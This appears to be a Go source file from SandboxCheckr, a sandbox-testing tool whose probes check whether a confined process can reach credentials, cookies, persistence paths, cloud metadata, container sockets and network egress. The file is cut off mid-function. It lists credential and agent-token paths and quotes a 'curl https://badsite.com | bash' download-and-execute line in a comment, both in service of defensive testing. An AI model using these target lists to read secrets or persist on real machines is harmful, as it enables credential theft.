// Package probe implements the active half of SandboxCheckr.
//
// Passive detection tells you a mechanism exists. It does not tell you the
// mechanism works, that the profile you generated says what you meant, or that
// the kernel enforces it the way the documentation claims. The only way to know
// is to get inside the sandbox and try things.
//
// The battery below is the child-side payload. It runs as a hidden `__probe`
// subcommand of this same binary, launched inside a candidate sandbox by the
// harness, and reports what actually happened as JSON on stdout.
package probe

import (
	"bufio"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/danielcuthbert/sandboxcheckr/internal/model"
)

// dialTimeout bounds each network probe. A sandbox that blackholes packets
// rather than refusing them would otherwise hang the whole run.
const dialTimeout = 4 * time.Second

// networkBudget bounds the network probes together, and sits well inside
// runTimeout. Each dial is capped at dialTimeout on its own, but the probes run
// serially and a dozen blackholed ones add up to more than the confined child is
// allowed: the child was being killed before it printed any JSON, so the
// strongest egress deny, the one that drops packets instead of refusing them,
// was scored INDETERMINATE with nothing. Past the budget the probes still to
// run report ERRORED, and the battery still reports.
const networkBudget = 20 * time.Second

// probeMarker is the only content the write probes ever create. A file carrying
// it is recognisable as the probe's own, which is what lets a later run tell a
// file left by its own crashed predecessor from one someone else put there.
const probeMarker = "sandboxcheckr probe; safe to delete"

// leftoverMarker reports whether p is a file the probe itself wrote and a killed
// run left behind: our name and our content, and nothing else. The size is
// checked first so that a file someone else left under our name cannot make the
// probe read it all into memory.
func leftoverMarker(p string) bool {
	fi, err := os.Stat(p)
	if err != nil || !fi.Mode().IsRegular() || fi.Size() != int64(len(probeMarker)) {
		return false
	}
	b, err := os.ReadFile(p)
	return err == nil && string(b) == probeMarker
}

// dnsLookup is how net.egress.dns asks a name. A variable because the answer
// that decides the verdict is the awkward one, a resolver that replies with no
// addresses at all, and the system resolver cannot be made to do that on demand.
var dnsLookup = func(ctx context.Context, host string) ([]string, error) {
	return (&net.Resolver{}).LookupHost(ctx, host)
}

// egressAddr is a literal address, deliberately not a hostname, so that
// net.egress.tcp measures TCP egress alone and does not fail merely because
// DNS was unavailable. Port 443 is the one most likely to be permitted by a
// partially-configured egress policy, which makes it the honest thing to test.
const egressAddr = "1.1.1.1:443"

// egressHost is resolved by net.egress.dns. DNS gets its own probe because it
// leaks data and enables exfiltration even when TCP egress is blocked, and
// because sandboxes routinely allow it by accident when they permit access to
// a local resolver socket.
const egressHost = "example.com"

// secretPaths are the files an untrusted process would actually want. We only
// attempt to open them and immediately close: the probe records the errno and
// never reads a byte of content into memory.
var secretPaths = []string{
	".ssh/id_rsa",
	".ssh/id_ed25519",
	".ssh/id_ecdsa",
	".aws/credentials",
	".aws/sso/cache",
	".config/gh/hosts.yml",
	".netrc",
	".git-credentials",
	".npmrc",
	".pypirc",
	".docker/config.json",
	".kube/config",
	".config/gcloud/application_default_credentials.json",
	".config/gcloud/credentials.db",
	".azure/msal_token_cache.json",
	".vault-token",
	".terraform.d/credentials.tfrc.json",
	".config/op",
	// Agent credentials: a sandboxed agent reading another agent's token is
	// the most direct form of lateral movement between tools.
	".claude/.credentials.json",
	".codex/auth.json",
	".config/gcloud/legacy_credentials",
}

// browserProfiles hold session cookies, which are bearer credentials for every
// site the user is logged into. Safari's data is TCC-protected and is covered
// by the Full Disk Access probe instead.
var browserProfiles = map[string][]string{
	"darwin": {
		"Library/Application Support/Google/Chrome",
		"Library/Application Support/Firefox/Profiles",
		"Library/Application Support/BraveSoftware/Brave-Browser",
		"Library/Application Support/Microsoft Edge",
		"Library/Application Support/Arc/User Data",
	},
	"linux": {
		".config/google-chrome",
		".config/chromium",
		".mozilla/firefox",
		".config/BraveSoftware/Brave-Browser",
	},
	"windows": {
		"AppData/Local/Google/Chrome/User Data",
		"AppData/Roaming/Mozilla/Firefox/Profiles",
		"AppData/Local/Microsoft/Edge/User Data",
	},
}

// Options configures a battery run. The parent harness fills these in from
// outside the sandbox, because several answers can only be judged against what
// is true on the host.
type Options struct {
	// Workdir is the scratch directory the sandbox is expected to permit
	// writes to; it is the subject of the positive control.
	Workdir string
	// Home is the user's real home directory on the host. Passed explicitly
	// rather than read from $HOME, because a sandbox may point $HOME somewhere
	// else and the question is whether the REAL home is reachable.
	Home string
	// HomeID is the host's "device:inode" identity for Home. When the sandbox
	// shows a different directory at that path (an empty tmpfs, say), writes
	// "succeed" into something that is thrown away — which is isolation, not
	// exposure, and must not be reported as ALLOWED.
	HomeID string
	// Online records that the parent resolved a name outside the sandbox. A
	// lookup that fails inside is only evidence of containment when it would
	// have worked outside.
	Online bool
	// TCC enables the macOS privacy-folder probes, which can raise consent
	// dialogs and are therefore opt-in.
	TCC bool
	// AgentSockets are agent socket paths found on the host (SSH_AUTH_SOCK
	// and friends). Passed from the parent because a sandbox scrubs the
	// environment, and the question is whether the REAL socket is reachable.
	AgentSockets []string
	// ExpectProxy is the egress proxy address a proxied sandbox must be able
	// to reach. Empty for every other configuration.
	ExpectProxy string
	CanaryHost  string
}

// HostOnline mirrors Options.Online for probes that need it.
var HostOnline bool

// RunBattery executes every probe and returns the results.
func RunBattery(o Options) []model.ProbeResult {
	HostOnline = o.Online
	if o.Home == "" {
		o.Home, _ = os.UserHomeDir()
	}
	home := homeView(o.Home, o.HomeID)

	// One budget shared by every network probe, so the serial sum of the dials
	// cannot outrun the child itself. See networkBudget.
	ctx, cancel := context.WithTimeout(context.Background(), networkBudget)
	defer cancel()

	out := []model.ProbeResult{
		probeWriteAllowed(o.Workdir),
		probeWriteOutside(home),
		probePersistence(home),
		probeDeferredExec(o.Workdir),
		probeReadSecrets(home),
		probeWorkdirSecrets(o.Workdir),
		probeBrowserProfiles(home),
		probeCredentialStore(home),
	}
	// The proxy probes come ahead of the internet dials because they are
	// positive controls: a blackholed egress that spends the shared network
	// budget must not be able to starve the probe deciding whether this sandbox
	// can run anything at all. They talk to our own proxy on loopback, so they
	// cost almost nothing and lose nothing by going first.
	if o.ExpectProxy != "" {
		out = append(out, probeProxyControl(ctx, o.ExpectProxy))
		if o.CanaryHost != "" {
			out = append(out, probeCanaryDetection(ctx, o.ExpectProxy, o.CanaryHost))
		}
	}
	out = append(out,
		probeNetTCP(ctx),
		probeNetDNS(ctx),
		probeCloudMetadata(ctx),
		probeContainerSocket(ctx),
		probeAgentSockets(ctx, o.AgentSockets),
		probeProcExec(),
	)
	out = append(out, RunExfilBattery(ctx, home)...)
	// brokerProbes are macOS-specific (empty elsewhere): they test egress
	// performed by a system daemon on the process's behalf, which the socket-level
	// probes above cannot see. Regression coverage for SBX-001.
	//
	// They and the TCC probes run helper binaries rather than opening sockets, so
	// outOfBudget does not apply to them, but their bounded waits inherit the
	// same ceiling: the serial sum of every probe in the child has to fit inside
	// runTimeout, not just the dials.
	out = append(out, brokerProbes(ctx)...)
	return append(out, tccProbes(ctx, home, o.TCC)...)
}

// home is the probe's view of the user's home directory.
type home struct {
	// path is the real host path.
	path string
	// isolated is true when the sandbox does not show the real home at that
	// path at all: it is missing, or something else (a tmpfs) is mounted there.
	isolated bool
	// reason explains isolated, for the report.
	reason string
}

// homeView decides whether the sandbox shows the real home directory.
func homeView(path, hostID string) home {
	h := home{path: path}
	if path == "" {
		return h
	}
	fi, err := os.Stat(path)
	if err != nil {
		if errors.Is(err, os.ErrNotExist) {
			h.isolated = true
			h.reason = "the home directory is not present in the sandbox's view of the filesystem"
		}
		return h
	}
	if hostID != "" {
		if id := FileID(fi); id != "" && id != hostID {
			h.isolated = true
			h.reason = "the sandbox shows a different, private directory at the home path, " +
				"so nothing in the real home is reachable and writes do not reach the host"
		}
	}
	return h
}

// isolatedResult is the verdict for a home-relative probe when the real home is
// not in the sandbox at all. It is BLOCKED rather than SKIPPED: the files exist
// on the host, and the sandbox is the reason they cannot be reached.
func (h home) isolatedResult(id model.ProbeID) model.ProbeResult {
	return model.ProbeResult{ID: id, Want: model.VerdictBlocked, Verdict: model.VerdictBlocked,
		Detail: h.reason}
}

// probeAgentSockets reports whether a credential agent can be reached.
//
// Only connect(2) is attempted — no protocol bytes are sent — because
// reachability is the whole finding: whatever can connect to an unlocked
// ssh-agent can ask it to sign, without ever seeing a key file.
func probeAgentSockets(ctx context.Context, socks []string) model.ProbeResult {
	r := model.ProbeResult{ID: model.ProbeSSHAgent, Want: model.VerdictBlocked}
	if got, done := outOfBudget(ctx, r); done {
		return got
	}
	var present, reached []string
	blocked := 0
	d := net.Dialer{Timeout: dialTimeout}
	for _, s := range socks {
		if _, err := os.Stat(s); err != nil {
			if !errors.Is(err, os.ErrNotExist) {
				if v, _ := classify(err); v == model.VerdictBlocked {
					present = append(present, s)
					blocked++
				}
			}
			continue
		}
		present = append(present, s)
		c, err := d.DialContext(ctx, "unix", s)
		if err == nil {
			_ = c.Close()
			reached = append(reached, filepath.Base(filepath.Dir(s))+"/"+filepath.Base(s))
			continue
		}
		if v, _, _ := classifyNet(err); v == model.VerdictBlocked {
			blocked++
		}
	}
	switch {
	case len(present) == 0:
		r.Verdict = model.VerdictSkipped
		r.Detail = "no SSH, GPG or 1Password agent socket found"
	case len(reached) > 0:
		r.Verdict = model.VerdictAllowed
		r.Detail = "a credential agent is reachable (" + strings.Join(reached, ", ") +
			"); a program can ask it to sign as you — push code, log in to servers — without reading any key file"
	case blocked == len(present):
		r.Verdict = model.VerdictBlocked
		r.Detail = "credential agent sockets are present but refused"
	default:
		r.Verdict = model.VerdictErrored
		r.Detail = "agent socket access was inconclusive"
	}
	return r
}

// probeProxyControl is the network positive control for a proxied sandbox:
// the confined process must reach its proxy, or the configuration contains
// everything and runs nothing — which is how the first proxied profile shipped.
func probeProxyControl(ctx context.Context, addr string) model.ProbeResult {
	r := model.ProbeResult{ID: model.ProbeProxyControl, Want: model.VerdictAllowed}
	if got, done := outOfBudget(ctx, r); done {
		return got
	}
	d := net.Dialer{Timeout: dialTimeout}
	c, err := d.DialContext(ctx, "tcp", addr)
	if err == nil {
		_ = c.Close()
		r.Verdict = model.VerdictAllowed
		r.Detail = "the egress proxy at " + addr + " is reachable, so allow-listed hosts will work"
		return r
	}
	r.Verdict, r.Errno, _ = classifyNet(err)
	r.Err = err.Error()
	r.Detail = "the egress proxy at " + addr + " is NOT reachable; nothing that needs the network will work"
	return r
}

func probeCanaryDetection(ctx context.Context, addr, host string) model.ProbeResult {
	r := model.ProbeResult{ID: model.ProbeCanaryDetection, Want: model.VerdictAllowed, Verdict: model.VerdictErrored,
		Detail: "canary detection is unverified on this host"}
	if got, done := outOfBudget(ctx, r); done {
		return got
	}
	d := net.Dialer{Timeout: dialTimeout}
	c, err := d.DialContext(ctx, "tcp", addr)
	if err != nil {
		r.Err = err.Error()
		return r
	}
	defer c.Close()
	_ = c.SetDeadline(deadline(ctx, dialTimeout))
	_, err = fmt.Fprintf(c, "CONNECT %s:443 HTTP/1.1\r\nHost: %s:443\r\n\r\n", host, host)
	if err != nil {
		r.Err = err.Error()
		return r
	}
	line, err := bufio.NewReader(c).ReadString('\n')
	if err != nil {
		r.Err = err.Error()
		return r
	}
	if !strings.Contains(line, " 403 ") {
		r.Err = "canary connection was not refused: " + strings.TrimSpace(line)
	}
	// The parent checks the proxy's trip record before marking this verified.
	return r
}

// probeBrowserProfiles reports whether browser profile directories, and so the
// session cookies inside them, are readable.
func probeBrowserProfiles(h home) model.ProbeResult {
	r := model.ProbeResult{ID: model.ProbeFSReadBrowser, Want: model.VerdictBlocked}
	if h.isolated {
		return h.isolatedResult(r.ID)
	}
	var present, readable []string
	blocked := 0
	for _, rel := range browserProfiles[runtime.GOOS] {
		p := filepath.Join(h.path, rel)
		if _, err := os.Lstat(p); err != nil {
			continue
		}
		present = append(present, rel)
		f, err := os.Open(p)
		if err != nil {
			if v, _ := classify(err); v == model.VerdictBlocked {
				blocked++
			}
			continue
		}
		// Opening a directory can succeed where listing it does not, so list
		// one entry to prove the contents are reachable.
		_, rerr := f.Readdirnames(1)
		_ = f.Close()
		if rerr == nil || errors.Is(rerr, io.EOF) {
			readable = append(readable, rel)
		} else if v, _ := classify(rerr); v == model.VerdictBlocked {
			blocked++
		}
	}
	switch {
	case len(present) == 0:
		r.Verdict = model.VerdictSkipped
		r.Detail = "no browser profiles found on this machine"
	case len(readable) > 0:
		r.Verdict = model.VerdictAllowed
		r.Detail = "browser profiles are readable (" + strings.Join(readable, ", ") +
			"); session cookies in them are bearer credentials for every logged-in site"
	case blocked == len(present):
		r.Verdict = model.VerdictBlocked
		r.Detail = "browser profiles are present but not readable"
	default:
		// A profile we could not open for a reason other than a permission
		// refusal (a dangling symlink, an I/O error) tells us nothing about
		// what the sandbox would have done.
		r.Verdict = model.VerdictErrored
		r.Detail = "browser profile access produced inconclusive errors"
	}
	return r
}

// persistencePaths are locations where a write survives a reboot. Getting code
// into any of these turns a transient compromise into a permanent one, which is
// why this is scored apart from ordinary out-of-workdir writes.
var persistencePaths = map[string][]string{
	"darwin": {
		"Library/LaunchAgents/sandboxcheckr-probe.plist",
		".zshrc", ".zprofile", ".bash_profile", ".profile",
	},
	"linux": {
		".config/systemd/user/sandboxcheckr-probe.service",
		".config/autostart/sandboxcheckr-probe.desktop",
		".bashrc", ".zshrc", ".profile",
	},
	"windows": {
		"AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/sandboxcheckr-probe.txt",
	},
}

// credentialStorePaths are the OS credential stores, which hold far more than
// the dotfiles in secretPaths.
var credentialStorePaths = map[string][]string{
	"darwin":  {"Library/Keychains"},
	"linux":   {".local/share/keyrings", ".gnupg"},
	"windows": {"AppData/Roaming/Microsoft/Credentials", "AppData/Local/Microsoft/Credentials", "AppData/Roaming/Microsoft/Protect"},
}

// containerSockets are control sockets that generally confer root on the host.
var containerSockets = []string{
	"/var/run/docker.sock",
	"/run/docker.sock",
	"/run/podman/podman.sock",
}

// metadataAddr is the cloud instance metadata endpoint. It is link-local and
// unauthenticated: on AWS, GCP, Azure and most CI runners, anything that can
// reach it can usually mint credentials for the whole instance role.
const metadataAddr = "169.254.169.254:80"

// probePersistence attempts to write to reboot-surviving locations.
//
// Scored separately from fs.write.outside because the consequences differ in
// kind, not degree: a sandbox that blocks scratch writes but permits writing
// ~/.zshrc has not contained anything that matters.
func probePersistence(h home) model.ProbeResult {
	r := model.ProbeResult{ID: model.ProbePersistence, Want: model.VerdictBlocked}
	if h.path == "" {
		r.Verdict, r.Err = model.VerdictErrored, "home directory unknown"
		return r
	}
	if h.isolated {
		return h.isolatedResult(r.ID)
	}
	home := h.path

	paths := persistencePaths[runtime.GOOS]
	if len(paths) == 0 {
		r.Verdict = model.VerdictSkipped
		return r
	}

	var written, existing []string
	attempted, blocked := 0, 0

	// A run killed mid-probe leaves its own files behind, and the next run
	// reads them the wrong way: an existing file answers the O_APPEND open and
	// is reported as a write the sandbox never permitted. Clear our own names
	// first, and only ever a file carrying the probe's own marker, never one a
	// real installer or the user put there.
	for _, rel := range paths {
		if !strings.Contains(filepath.Base(rel), "sandboxcheckr-probe") {
			continue
		}
		if p := filepath.Join(home, rel); leftoverMarker(p) {
			_ = os.Remove(p)
		}
	}

	for _, rel := range paths {
		p := filepath.Join(home, rel)
		// Never truncate a real dotfile. Only a path that does not already
		// exist is a safe write target, and O_EXCL guarantees we lose the race
		// rather than clobber a file someone depends on.
		if _, err := os.Lstat(p); err == nil {
			// The file exists, so we will not create it. Whether it could be
			// MODIFIED is answered without touching its content by asking the
			// kernel for write access on an O_APPEND open that writes nothing.
			if f, err := os.OpenFile(p, os.O_WRONLY|os.O_APPEND, 0); err == nil {
				_ = f.Close()
				existing = append(existing, rel)
			} else if v, _ := classify(err); v == model.VerdictBlocked {
				blocked++
			}
			attempted++
			continue
		}
		attempted++
		f, err := os.OpenFile(p, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0o600)
		if err != nil {
			if v, _ := classify(err); v == model.VerdictBlocked {
				blocked++
			}
			continue
		}
		_, _ = f.WriteString(probeMarker)
		_ = f.Close()
		_ = os.Remove(p)
		written = append(written, rel)
	}

	switch {
	case len(written)+len(existing) > 0:
		r.Verdict = model.VerdictAllowed
		r.Detail = "can create or modify startup/shell files (" +
			strings.Join(append(written, existing...), ", ") +
			"); untrusted code could persist across reboots"
	case blocked > 0 && blocked == attempted:
		// BLOCKED is worth its weight, so it takes every attempt saying so. One
		// EACCES among a set of missing parent directories is not the sandbox
		// refusing, it is one coincidence in a home directory that has no
		// systemd user unit directory.
		r.Verdict = model.VerdictBlocked
		r.Detail = "cannot create or modify startup or shell configuration files"
	default:
		// Attempts failed for a reason other than a permission refusal (a
		// missing parent directory, typically), or only some of them were
		// refused. Neither is evidence the sandbox would have stopped the rest.
		r.Verdict = model.VerdictErrored
		r.Detail = fmt.Sprintf("persistence probe was inconclusive (%d attempts, %d refused by permission)", attempted, blocked)
	}
	return r
}

// probeCredentialStore attempts to list the OS credential store.
func probeCredentialStore(h home) model.ProbeResult {
	r := model.ProbeResult{ID: model.ProbeCredentialStore, Want: model.VerdictBlocked}
	if h.path == "" {
		r.Verdict, r.Err = model.VerdictErrored, "home directory unknown"
		return r
	}
	if h.isolated {
		return h.isolatedResult(r.ID)
	}

	var readable []string
	var present, blocked int
	for _, rel := range credentialStorePaths[runtime.GOOS] {
		p := filepath.Join(h.path, rel)
		if _, err := os.Lstat(p); err != nil {
			continue
		}
		present++
		f, err := os.Open(p)
		if err != nil {
			if v, _ := classify(err); v == model.VerdictBlocked {
				blocked++
			}
			continue
		}
		// Opening a directory can succeed where listing it does not, so list
		// one entry to prove the contents are reachable.
		_, rerr := f.Readdirnames(1)
		_ = f.Close()
		if rerr == nil || errors.Is(rerr, io.EOF) {
			readable = append(readable, rel)
		} else if v, _ := classify(rerr); v == model.VerdictBlocked {
			blocked++
		}
	}

	switch {
	case present == 0:
		r.Verdict = model.VerdictSkipped
		r.Detail = "no OS credential store found on this machine"
	case len(readable) > 0:
		r.Verdict = model.VerdictAllowed
		r.Detail = "the OS credential store is accessible: " + strings.Join(readable, ", ")
	case blocked == present:
		r.Verdict = model.VerdictBlocked
		r.Detail = "the OS credential store files are not accessible"
	default:
		r.Verdict = model.VerdictErrored
		r.Detail = "credential store access produced inconclusive errors"
	}
	return r
}

// probeCloudMetadata tests reachability of the instance metadata service.
//
// This is the single highest-value probe on a CI runner or cloud VM: the
// endpoint is unauthenticated, so any code that can open a socket to it can
// usually obtain credentials for the instance's role. A sandbox that blocks
// general egress but permits link-local traffic has left this wide open.
func probeCloudMetadata(ctx context.Context) model.ProbeResult {
	r := model.ProbeResult{ID: model.ProbeCloudMetadata, Want: model.VerdictBlocked}
	if got, done := outOfBudget(ctx, r); done {
		return got
	}
	d := net.Dialer{Timeout: dialTimeout}
	conn, err := d.DialContext(ctx, "tcp", metadataAddr)
	if err == nil {
		_ = conn.Close()
		r.Verdict = model.VerdictAllowed
		r.Detail = "the cloud metadata endpoint is reachable; on a cloud instance or CI runner " +
			"this can hand out instance credentials to unauthenticated callers"
		return r
	}
	var detail string
	r.Verdict, r.Errno, detail = classifyNet(err)
	r.Err = err.Error()
	r.Detail = "cloud metadata endpoint: " + detail
	return r
}

// probeContainerSocket tests access to a container control socket, which is
// usually equivalent to root on the host: anything that can talk to it can
// start a privileged container mounting the host filesystem.
func probeContainerSocket(ctx context.Context) model.ProbeResult {
	r := model.ProbeResult{ID: model.ProbeContainerSocket, Want: model.VerdictBlocked}
	if got, done := outOfBudget(ctx, r); done {
		return got
	}

	var present, opened []string
	blocked := 0
	d := net.Dialer{Timeout: dialTimeout}
	for _, p := range containerSockets {
		if _, err := os.Lstat(p); err != nil {
			continue
		}
		present = append(present, p)
		conn, err := d.DialContext(ctx, "unix", p)
		if err == nil {
			_ = conn.Close()
			opened = append(opened, p)
			continue
		}
		// Only a refusal is containment. A dial that timed out, or failed
		// because the daemon behind the socket never answers, says nothing
		// about whether the sandbox would have let us in.
		if v, _, _ := classifyNet(err); v == model.VerdictBlocked {
			blocked++
		}
	}

	switch {
	case len(present) == 0:
		r.Verdict = model.VerdictSkipped
		r.Detail = "no container control socket present on this machine"
	case len(opened) > 0:
		r.Verdict = model.VerdictAllowed
		r.Detail = "container control socket is reachable (" + strings.Join(opened, ", ") +
			"); this is generally equivalent to root on the host"
	case blocked == len(present):
		r.Verdict = model.VerdictBlocked
		r.Detail = "container control sockets are present but each one refused the connection"
	default:
		r.Verdict = model.VerdictErrored
		r.Detail = "container control socket access produced inconclusive errors"
	}
	return r
}

// WriteResults serialises the battery for the parent harness.
func WriteResults(w io.Writer, results []model.ProbeResult) error {
	enc := json.NewEncoder(w)
	enc.SetIndent("", "  ")
	return enc.Encode(results)
}

// outOfBudget is the answer for a network probe that never got to start
// because the battery's shared budget had already gone. Not trying is not
// evidence that the sandbox would have refused, so this is ERRORED, and the
// child still lives long enough to print the results it does have.
func outOfBudget(ctx context.Context, r model.ProbeResult) (model.ProbeResult, bool) {
	if ctx.Err() == nil {
		return r, false
	}
	r.Verdict = model.VerdictErrored
	r.Err = ctx.Err().Error()
	r.Detail = "the battery network budget was exhausted before this probe ran; not counted as contained"
	return r, true
}

// deadline is when one socket operation must stop: its own timeout, or the
// battery's shared network budget, whichever comes first.
func deadline(ctx context.Context, d time.Duration) time.Time {
	until := time.Now().Add(d)
	if budget, ok := ctx.Deadline(); ok && budget.Before(until) {
		return budget
	}
	return until
}

// classify turns an operation's error into a verdict. The distinction between
// BLOCKED and ERRORED is the most important judgement the probe makes: a
// permission error means the sandbox did its job, while any other failure means
// we learned nothing and must not claim containment.
func classify(err error) (model.Verdict, string) {
	if err == nil {
		return model.VerdictAllowed, ""
	}
	var errno syscall.Errno
	if errors.As(err, &errno) {
		switch errno {
		case syscall.EPERM, syscall.EACCES, syscall.EROFS:
			return model.VerdictBlocked, errno.Error()
		}
		return model.VerdictErrored, errno.Error()
	}
	return model.VerdictErrored, ""
}

// classifyNet classifies a network failure, separating refusal from timeout.
//
// The distinction matters more than it looks. A refused connection is positive
// evidence that something denied us. A timeout is not: it looks identical
// whether the sandbox blackholed the packet, the corporate network dropped it,
// or the host is simply offline. Counting a timeout as containment would let
// SandboxCheckr report a machine as protected because its Wi-Fi was off.
//
// So timeouts are inconclusive. That under-credits sandboxes which blackhole
// rather than refuse, and that is the correct direction to be wrong in: the
// tool may understate protection, but it will never claim protection it did
// not observe.
func classifyNet(err error) (model.Verdict, string, string) {
	if err == nil {
		return model.VerdictAllowed, "", ""
	}
	var errno syscall.Errno
	if errors.As(err, &errno) {
		switch errno {
		case syscall.EPERM, syscall.EACCES, syscall.ECONNREFUSED, syscall.ENETUNREACH, syscall.EHOSTUNREACH:
			return model.VerdictBlocked, errno.Error(), "the connection was actively refused"
		}
	}
	var nerr net.Error
	if errors.As(err, &nerr) && nerr.Timeout() {
		return model.VerdictErrored, "timeout",
			"the connection timed out, which cannot distinguish a sandbox blackholing traffic " +
				"from an unreachable network; not counted as contained"
	}
	return model.VerdictErrored, "", "the attempt failed inconclusively"
}

// probeWriteAllowed is the positive control, and the reason ranking cannot be
// gamed by a maximally restrictive profile.
//
// A sandbox that denies everything scores perfectly on containment and is
// useless: you cannot run a coding agent in a box where it cannot write to its
// own project directory. If this probe fails, the mechanism is marked unusable
// no matter how well it contained everything else.
func probeWriteAllowed(workdir string) model.ProbeResult {
	r := model.ProbeResult{ID: model.ProbeFSWriteAllowed, Want: model.VerdictAllowed}
	if workdir == "" {
		r.Verdict = model.VerdictSkipped
		r.Detail = "no scratch workdir was provided"
		return r
	}
	p := filepath.Join(workdir, "sandboxcheckr-positive-control")
	err := os.WriteFile(p, []byte("ok"), 0o600)
	r.Verdict, r.Errno = classify(err)
	if err != nil {
		r.Err = err.Error()
		r.Detail = "could not write inside the permitted workdir; this sandbox would break the program you want to run"
		return r
	}
	_ = os.Remove(p)
	r.Detail = "writes inside the permitted workdir succeed, so a program can still do useful work"
	return r
}

// probeWriteOutside attempts a write to the home directory — outside anything
// the sandbox should permit. If this succeeds, malicious code can drop a
// payload into a shell profile and persist.
func probeWriteOutside(h home) model.ProbeResult {
	r := model.ProbeResult{ID: model.ProbeFSWriteOutside, Want: model.VerdictBlocked}
	if h.path == "" {
		r.Verdict = model.VerdictErrored
		r.Detail = "could not determine the home directory"
		return r
	}
	if h.isolated {
		return h.isolatedResult(r.ID)
	}
	p := filepath.Join(h.path, ".sandboxcheckr-probe")
	// O_EXCL: never overwrite a file that happens to have this name.
	f, err := os.OpenFile(p, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0o600)
	if err == nil {
		_, _ = f.WriteString(probeMarker)
		_ = f.Close()
	} else if errors.Is(err, os.ErrExist) && leftoverMarker(p) {
		// A run killed before its cleanup left a file here, and every run after
		// it would meet EEXIST and report the write refused by a home directory
		// that has never been protected. Our own marker in that file is proof a
		// previous write succeeded, which is the finding the leftover is hiding.
		r.Verdict = model.VerdictAllowed
		r.Detail = "a marker left by an earlier run is still in the home directory, so writes " +
			"outside the workdir are not prevented"
		// Take the evidence with us: the next run then tests the sandbox rather
		// than reading the same leftover, and the probe leaves nothing behind on
		// a machine whose sandbox failed to stop it.
		_ = os.Remove(p)
		return r
	}
	r.Verdict, r.Errno = classify(err)
	if err != nil {
		r.Err = err.Error()
		if r.Verdict == model.VerdictBlocked {
			r.Detail = "writes outside the workdir are refused"
		} else {
			r.Detail = "the probe could not test writes outside the workdir; not counted as contained"
		}
		return r
	}
	// The write succeeded, so we made a mess. Clean it up: the probe must not
	// leave anything behind on a machine whose sandbox failed to stop it.
	_ = os.Remove(p)
	r.Detail = "wrote to the home directory; untrusted code could modify shell profiles to persist"
	return r
}

// probeReadSecrets attempts to open credential files. It records the errno and
// closes immediately, never reading contents: the question is whether access is
// permitted, and answering it does not require handling the secret.
func probeReadSecrets(h home) model.ProbeResult {
	r := model.ProbeResult{ID: model.ProbeFSReadSecrets, Want: model.VerdictBlocked}
	if h.path == "" {
		r.Verdict, r.Err = model.VerdictErrored, "home directory unknown"
		return r
	}
	if h.isolated {
		return h.isolatedResult(r.ID)
	}
	home := h.path

	var (
		opened  []string
		blocked int
		present int
	)
	for _, rel := range secretPaths {
		p := filepath.Join(home, rel)
		if _, err := os.Lstat(p); err != nil {
			// Not present on this machine, so it tells us nothing either way.
			continue
		}
		present++
		f, err := os.Open(p)
		if err == nil {
			_ = f.Close()
			opened = append(opened, rel)
			continue
		}
		if v, _ := classify(err); v == model.VerdictBlocked {
			blocked++
		}
	}

	switch {
	case present == 0:
		r.Verdict = model.VerdictSkipped
		r.Detail = "none of the credential files we test for exist on this machine"
	case len(opened) > 0:
		r.Verdict = model.VerdictAllowed
		r.Detail = "credential files are readable: " + strings.Join(opened, ", ")
	case blocked == present:
		r.Verdict = model.VerdictBlocked
		r.Detail = "all present credential files are unreadable"
	default:
		r.Verdict = model.VerdictErrored
		r.Detail = "credential file access produced inconclusive errors"
	}
	return r
}

// probeNetTCP tests raw TCP egress to a literal IP. This is the probe that
// decides whether `curl https://badsite.com | bash` remains possible.
func probeNetTCP(ctx context.Context) model.ProbeResult {
	r := model.ProbeResult{ID: model.ProbeNetEgressTCP, Want: model.VerdictBlocked}
	if got, done := outOfBudget(ctx, r); done {
		return got
	}
	d := net.Dialer{Timeout: dialTimeout}
	conn, err := d.DialContext(ctx, "tcp", egressAddr)
	if err == nil {
		_ = conn.Close()
		r.Verdict = model.VerdictAllowed
		r.Detail = "outbound TCP to " + egressAddr + " succeeded; arbitrary download-and-execute is possible"
		return r
	}
	var detail string
	r.Verdict, r.Errno, detail = classifyNet(err)
	r.Err = err.Error()
	r.Detail = "outbound TCP to " + egressAddr + ": " + detail
	return r
}

// probeNetDNS tests name resolution separately from TCP. DNS alone is a viable
// exfiltration channel, and sandboxes frequently permit it unintentionally by
// allowing access to the local resolver.
func probeNetDNS(ctx context.Context) model.ProbeResult {
	r := model.ProbeResult{ID: model.ProbeNetEgressDNS, Want: model.VerdictBlocked}
	if got, done := outOfBudget(ctx, r); done {
		return got
	}
	ctx, cancel := context.WithTimeout(ctx, dialTimeout)
	defer cancel()
	addrs, err := dnsLookup(ctx, egressHost)
	if err == nil && len(addrs) == 0 {
		// NODATA: the resolver answered, it just had nothing to say. That is a
		// working resolver, so it is not containment, and no address came back,
		// so it is not exposure either. Handing it to classifyNet with a nil
		// error would have reported it as a successful lookup, which the report
		// then renders as a failed egress deny.
		r.Verdict = model.VerdictErrored
		r.Detail = "the resolver answered for " + egressHost + " with no addresses; neither " +
			"containment nor exposure"
		return r
	}
	if err == nil {
		r.Verdict = model.VerdictAllowed
		r.Detail = "DNS resolution succeeded; data can be exfiltrated via lookups even without TCP egress"
		return r
	}
	var detail string
	r.Verdict, r.Errno, detail = classifyNet(err)
	if err != nil {
		r.Err = err.Error()
	}
	// A lookup that fails quickly (not a timeout) while the same name resolves
	// outside the sandbox is the sandbox refusing it. Without the outside
	// control we could not tell that apart from an offline laptop.
	var dnsErr *net.DNSError
	if r.Verdict == model.VerdictErrored && HostOnline && errors.As(err, &dnsErr) && !dnsErr.IsTimeout {
		r.Verdict = model.VerdictBlocked
		r.Detail = "DNS resolution fails inside the sandbox although it works outside: " + dnsErr.Err
		return r
	}
	r.Detail = "DNS resolution: " + detail
	return r
}

// probeProcExec tests whether the sandboxed process can spawn a shell.
//
// This is informational rather than pass/fail in practice: a coding agent needs
// to run commands, so blocking exec usually means the sandbox is unusable for
// the intended purpose. It is reported because it changes the shape of the risk
// — without exec, a payload must be pure in-process code.
func probeProcExec() model.ProbeResult {
	r := model.ProbeResult{ID: model.ProbeProcExec, Want: model.VerdictBlocked}
	cmd := exec.Command("/bin/sh", "-c", "true")
	if runtime.GOOS == "windows" {
		cmd = exec.Command(filepath.Join(os.Getenv("SystemRoot"), "System32", "cmd.exe"), "/c", "exit 0")
	}
